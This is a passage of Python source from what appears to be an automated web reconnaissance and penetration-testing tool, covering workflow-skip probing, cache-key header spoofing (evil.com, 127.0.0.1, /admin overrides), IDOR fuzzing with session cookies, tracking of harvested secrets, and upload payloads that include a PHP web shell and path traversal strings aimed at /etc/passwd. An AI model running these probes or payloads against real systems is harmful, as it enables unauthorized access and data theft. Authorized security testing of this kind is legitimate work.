    findings: List[str] = []
    _wf_urlopen = _get_urlopener()
    _wf_headers = _extra_headers_dict()
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "76-WORKFLOW: no URLs; skipping")
        return {"76-WORKFLOW": str(_out), "count": 0}
    # Identify potential workflow endpoints (checkout, order, payment, submit, etc.)
    workflow_keywords = {
        "cart", "checkout", "order", "payment", "billing", "submit",
        "confirm", "complete", "register", "enroll", "purchase",
        "booking", "reservation", "checkin", "review", "apply",
    }
    workflow_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(kw in u_lower for kw in workflow_keywords):
            workflow_urls.append(u)
    if not workflow_urls:
        findings.append("[result] No workflow endpoints detected")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        return {"76-WORKFLOW": str(_out), "count": 0}
    findings.append(f"[workflow-endpoints] found {len(workflow_urls)} potential workflow endpoints")
    for u in sorted(set(workflow_urls))[:30]:
        findings.append(f"  {u}")
    # Test direct access to POST-only endpoints via GET (workflow skip)
    _wf_sem = asyncio.Semaphore(10)
    for u in sorted(set(workflow_urls))[:10]:
        base = u if u.startswith("http") else f"https://{u}"
        async with _wf_sem:
            await _throttle_rate()
            for method in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                try:
                    req = urllib.request.Request(base, method=method,
                        headers={"User-Agent": "Mozilla/5.0", **_wf_headers})
                    status, _, _ = await _async_urlopen(_wf_urlopen, req, timeout=10)
                    if status in (200, 201, 202, 204):
                        findings.append(f"[bypass] {method} {base} → HTTP {status} (may skip workflow)")
                except urllib.error.HTTPError as e:
                    if e.code in (401, 403):
                        pass
                    elif e.code in (405, 501):
                        findings.append(f"[expected] {method} {base} → HTTP {e.code} (method not allowed)")
                    else:
                        findings.append(f"[probed] {method} {base} → HTTP {e.code}")
                except Exception:
                    pass
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"76-WORKFLOW: {len(findings)} workflow findings → {out}")
    return {"76-WORKFLOW": str(_out), "count": len(findings)}


# ───────────────────── Phase 77-CACHEKEY: cache key probing ─────────────────────
async def phase_77_CACHEKEY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"77-CACHEKEY"}:
        return {}
    _out = outdir / "cache_key_probe.txt"
    if _out.exists() and not force:
        return {"77-CACHEKEY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 77-CACHEKEY: cache key composition probing")
    findings: List[str] = []
    _ck_urlopen = _get_urlopener()
    _ck_headers = _extra_headers_dict()
    targets_file = outdir / "host_targets.txt"
    if not targets_file.exists() or not read_lines(targets_file):
        log("warn", "77-CACHEKEY: no targets; skipping")
        return {"77-CACHEKEY": str(_out), "count": 0}
    _ck_sem = asyncio.Semaphore(5)
    def _cache_key_signature(headers: Any) -> str:
        age = headers.get("age", "0")
        cf_cache = headers.get("cf-cache-status", headers.get("x-cache", ""))
        etag = headers.get("etag", "")[:20]
        last_modified = headers.get("last-modified", "")[:20]
        return f"Age={age} CF={cf_cache} ETag={etag} LM={last_modified}"
    test_headers = [
        ("X-Forwarded-Host", "evil.com"),
        ("X-Forwarded-Port", "9999"),
        ("X-Http-Method-Override", "POST"),
        ("X-Original-URL", "/admin"),
        ("X-Rewrite-URL", "/admin"),
        ("X-Custom-IP-Authorization", "127.0.0.1"),
        ("X-Real-IP", "127.0.0.1"),
        ("X-Originating-IP", "127.0.0.1"),
        ("Accept", "application/json"),
        ("Accept-Encoding", "gzip"),
        ("X-Forwarded-Proto", "http"),
    ]
    for host in read_lines(targets_file)[:5]:
        base = host if host.startswith("http") else f"https://{host}"
        paths_to_probe = ["/", "/admin", "/api", "/login", "/robots.txt"]
        async with _ck_sem:
            await _throttle_rate()
            for path in paths_to_probe:
                url = f"{base.rstrip('/')}{path}"
                try:
                    baseline_req = urllib.request.Request(url, method="GET",
                        headers={"User-Agent": "Mozilla/5.0", **_ck_headers})
                    _, baseline_headers, _ = await _async_urlopen(_ck_urlopen, baseline_req, timeout=10)
                    baseline_sig = _cache_key_signature(baseline_headers)
                    for hdr_name, hdr_val in test_headers:
                        await _throttle_rate()
                        try:
                            test_req = urllib.request.Request(url, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", hdr_name: hdr_val, **_ck_headers})
                            _, test_headers_resp, _ = await _async_urlopen(_ck_urlopen, test_req, timeout=10)
                            test_sig = _cache_key_signature(test_headers_resp)
                            if test_sig != baseline_sig:
                                findings.append(f"[cache-key-factor] {url} header={hdr_name}:{hdr_val} differs from baseline")
                                findings.append(f"  baseline={baseline_sig}")
                                findings.append(f"  test={test_sig}")
                        except Exception:
                            continue
                except Exception:
                    continue
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"77-CACHEKEY: {len(findings)} cache key findings → {out}")
    return {"77-CACHEKEY": str(_out), "count": len(findings)}


# ───────────────────── Phase 78-FILEUPLOADADV: advanced file upload testing ─────────────────────
async def phase_78_FILEUPLOADADV(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"78-FILEUPLOADADV"}:
        return {}
    _out = outdir / "file_upload_adv.txt"
    if _out.exists() and not force:
        return {"78-FILEUPLOADADV": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 78-FILEUPLOADADV: advanced file upload polyglot + path traversal")
    findings: List[str] = []
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "78-FILEUPLOADADV: no URLs; skipping")
        return {"78-FILEUPLOADADV": str(_out), "count": 0}
    upload_indicators = ["upload", "file", "image", "avatar", "profile", "attachment",
                         "document", "import", "media", "photo", "resume", "csv"]
    _skip_domains = ("jimcdn.com", "jimdo.com", "cdn.", "assets.", "static.", "img.", "images.")
    upload_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(sd in u_lower for sd in _skip_domains):
            continue
        if any(ind in u_lower for ind in upload_indicators):
            upload_urls.append(u)
    if not upload_urls:
        findings.append("[result] No file upload endpoints discovered")
    else:
        findings.append(f"[upload-endpoints] found {len(upload_urls)} potential upload endpoints")
        for u in sorted(set(upload_urls))[:15]:
            findings.append(f"  {u}")
    findings.append("")
    findings.append("--- Polyglot Test Payloads ---")
    _polyglot_payloads = {
        "svg_xss": '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
        "gif_header": "GIF89a<?php system($_GET['cmd']); ?>",
        "jpg_header": "\xFF\xD8\xFF\xE0<?php echo 'test'; ?>",
        "png_header": "\x89PNG\r\n\x1a\n<?php echo 'test'; ?>",
        "zip_slip": "PK\x03\x04...",
    }
    for name, payload in _polyglot_payloads.items():
        findings.append(f"  [{name}] {payload[:60]}...")
    findings.append("")
    findings.append("--- Path Traversal Payloads ---")
    _traversal_payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
    ]
    for payload in _traversal_payloads:
        findings.append(f"  [traversal] filename={payload}")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"78-FILEUPLOADADV: {len(findings)} file upload findings → {out}")
    return {"78-FILEUPLOADADV": str(_out), "count": len(findings)}

async def phase_79_SECRETDIFF(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"79-SECRETDIFF"}:
        return {}
    _out = outdir / "secret_rotation.txt"
    if _out.exists() and not force:
        return {"79-SECRETDIFF": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 79-SECRETDIFF: cross-scan secret rotation detection")
    findings: List[str] = []
    _state_dir = Path(os.environ.get("XDG_CACHE_HOME", Path.home() / ".cache")) / "reconchain" / "secrets"
    _state_dir.mkdir(parents=True, exist_ok=True)
    _secret_state_file = _state_dir / f"{outdir.name}_secrets.json"
    secret_state: Dict[str, str] = {}
    if _secret_state_file.exists():
        try:
            secret_state = json.loads(_secret_state_file.read_text(encoding="utf-8", errors="ignore"))
        except (json.JSONDecodeError, ValueError):
            secret_state = {}
    current_secrets: Dict[str, str] = {}
    for src_file in [outdir / "js_secrets.txt", outdir / "js_secrets_deep.txt",
                     outdir / "domain_creds.txt", outdir / "secrets.txt"]:
        if src_file.exists():
            for ln in read_lines(src_file):
                if "=" in ln:
                    k, v = ln.split("=", 1)
                    k = k.strip()[:60]
                    v_fp = hashlib.md5(v.strip().encode()).hexdigest()[:16]
                    current_secrets[k] = v_fp
    for key, old_hash in secret_state.items():
        if key not in current_secrets:
            findings.append(f"[removed] {key} — secret no longer present (may have been rotated)")
        elif current_secrets[key] != old_hash:
            findings.append(f"[rotated] {key} — value changed (old_hash={old_hash} new_hash={current_secrets[key]})")
    for key in current_secrets:
        if key not in secret_state:
            findings.append(f"[new] {key} — new secret detected (hash={current_secrets[key]})")
    if not findings:
        findings.append("[result] No secret rotation detected (baseline scan)")
    _secret_state_file.write_text(json.dumps(current_secrets, indent=2))
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"79-SECRETDIFF: {len(findings)} secret rotation findings → {out}")
    return {"79-SECRETDIFF": str(_out), "count": len(findings)}

async def phase_81_IDORFUZZ(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
    cfg: Optional[Any] = None,
) -> Dict[str, Any]:
    if skip & {"81-IDORFUZZ"}:
        return {}
    _out = outdir / "idor_fuzz.txt"
    if _out.exists() and not force:
        return {"81-IDORFUZZ": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 81-IDORFUZZ: cross-session IDOR diffing")
    findings: List[str] = []
    _id_urlopen = _get_urlopener()
    _id_headers = _extra_headers_dict()
    cookie_a = (getattr(cfg, 'idor_session_a', '') or "") or os.environ.get("COOKIE_A", os.environ.get("COOKIE", ""))
    cookie_b = (getattr(cfg, 'idor_session_b', '') or "") or os.environ.get("COOKIE_B", "")
    if not cookie_a and not cookie_b:
        log("warn", "81-IDORFUZZ: set COOKIE_A and COOKIE_B env vars for cross-session diffing")
        log("info", "81-IDORFUZZ: running in single-session mode (no diff)")
    urls_file = outdir / "urls_all.txt"
    if not urls_file.exists() or not read_lines(urls_file):
        log("warn", "81-IDORFUZZ: no URLs; skipping")
        return {"81-IDORFUZZ": str(_out), "count": 0}
    idor_sensitive_params = ["id", "user_id", "uid", "account", "account_id", "customer",
                             "order", "order_id", "document", "file_id", "profile_id",
                             "invoice", "payment", "transaction", "ref", "token"]
    target_urls: List[str] = []
    for u in read_lines(urls_file):
        u_lower = u.lower()
        if any(p in u_lower for p in idor_sensitive_params):
            target_urls.append(u)
    if not target_urls:
        target_urls = read_lines(urls_file)
    findings.append(f"[idor-targets] {len(target_urls)} candidate URLs")
    _id_sem = asyncio.Semaphore(10)
    for u in sorted(set(target_urls))[:30]:
        if not u.startswith("http"):
            u = f"https://{u}"
        async with _id_sem:
            await _throttle_rate()
            # Probe with different user IDs
            variations = {
                "id": ["1", "2", "1000", "999999", "admin", "00000000-0000-0000-0000-000000000000"],
                "user_id": ["1", "2", "0", "-1", "admin"],
                "uid": ["1", "2", "0", "-1"],
                "account": ["1", "2", "admin"],
                "order": ["1", "2", "1000"],
            }
            parsed = urllib.parse.urlparse(u)
            qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            if not qs:
                continue
            for pname in qs:
                if pname.lower() in idor_sensitive_params:
                    for pval in variations.get(pname.lower(), ["1", "2"]):
                        test_qs = qs.copy()
                        test_qs[pname] = [pval]
                        new_qs = urllib.parse.urlencode(test_qs, doseq=True)
                        test_url = urllib.parse.urlunparse(parsed._replace(query=new_qs))
                        for session_label, session_cookie in [("A", cookie_a), ("B", cookie_b)]:
                            if not session_cookie:
                                continue
                            try:
                                sess_headers = {"User-Agent": "Mozilla/5.0", "Cookie": session_cookie, **_id_headers}
                                req = urllib.request.Request(test_url, method="GET", headers=sess_headers)
                                status_a, headers_a, body_bytes_a = await _async_urlopen(_id_urlopen, req, timeout=10)
                                findings.append(f"[idor-{session_label}] {test_url} → HTTP {status_a} len={len(body_bytes_a)}")
                            except urllib.error.HTTPError as e:
                                findings.append(f"[idor-{session_label}] {test_url} → HTTP {e.code}")
                            except Exception:
                                pass
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"81-IDORFUZZ: {len(findings)} IDOR probes → {out}")
    return {"81-IDORFUZZ": str(_out), "count": len(findings)}
